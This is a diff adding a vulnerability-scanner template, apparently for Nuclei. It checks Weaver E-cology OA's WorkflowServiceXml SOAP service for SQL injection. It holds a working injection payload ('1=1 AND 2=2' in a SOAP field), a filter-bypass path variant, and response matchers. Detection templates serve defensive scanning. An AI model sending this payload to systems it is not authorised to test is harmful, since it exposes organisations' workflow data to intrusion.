@@ -1,0 +1,42 @@
+id: weaver-e-cology-workflowservicexml-sqli
+info:
+  name: 泛微OA E-cology WorkflowServiceXml SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,e-cology
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/services/WorkflowServiceXml"
+      - "{{BaseURL}}/services%20/WorkflowServiceXml"
+    headers:
+      Content-Type: text/xml
+    body: |-
+      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservices.workflow.weaver">
+      <soapenv:Header/>
+      <soapenv:Body>
+      <web:getHendledWorkflowRequestList>
+      <web:in0>1</web:in0>
+      <web:in1>1</web:in1>
+      <web:in2>1</web:in2>
+      <web:in3>1</web:in3>
+      <web:in4>
+      <web:string>1=1 AND 2=2</web:string>
+      </web:in4>
+      </web:getHendledWorkflowRequestList>
+      </soapenv:Body>
+      </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<workflowName>"
+          - "<creatorName>"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
